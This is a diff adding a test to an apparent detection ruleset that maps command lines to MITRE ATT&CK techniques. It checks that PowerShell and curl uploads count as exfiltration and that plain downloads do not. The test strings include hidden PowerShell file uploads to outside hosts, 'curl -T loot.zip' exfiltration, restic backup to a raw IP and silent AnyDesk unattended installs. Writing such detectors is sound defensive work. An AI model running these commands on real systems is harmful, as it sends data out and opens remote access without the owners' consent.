@@ -80,6 +80,15 @@ describe("tradecraftRules — strong (High) attacker tradecraft", () => {
     expect(sig("restic.exe -r rest:http://1.2.3.4:8000/ backup C:\\data")?.mitre).toContain("T1567.002");
   });
 
+  it("flags web-client file upload as exfiltration (T1041) but not a plain download", () => {
+    expect(sig("powershell.exe -nop -w hidden -c Invoke-RestMethod -Uri https://mft.brightparcel.io/u/inbox -Method Put -InFile C:\\Windows\\Temp\\rb.zip")?.mitre).toContain("T1041");
+    expect(sig("iwr -Uri https://x.tld/api -Method Post -Body $json")?.mitre).toContain("T1041");
+    expect(sig("curl -T loot.zip https://x.tld/upload")?.mitre).toContain("T1041");
+    // plain download / GET must NOT be graded as exfil
+    expect(sig("Invoke-RestMethod -Uri https://api.internal/status")?.mitre ?? []).not.toContain("T1041");
+    expect(sig("iwr https://example.com/tool.exe -OutFile tool.exe")?.mitre ?? []).not.toContain("T1041");
+  });
+
   it("flags AnyDesk/RustDesk unattended setup as strong, bare presence as weak", () => {
     expect(sig("anydesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win --silent")?.weight).toBe("strong");
     expect(sig("echo pw | anydesk.exe --set-password")?.weight).toBe("strong");
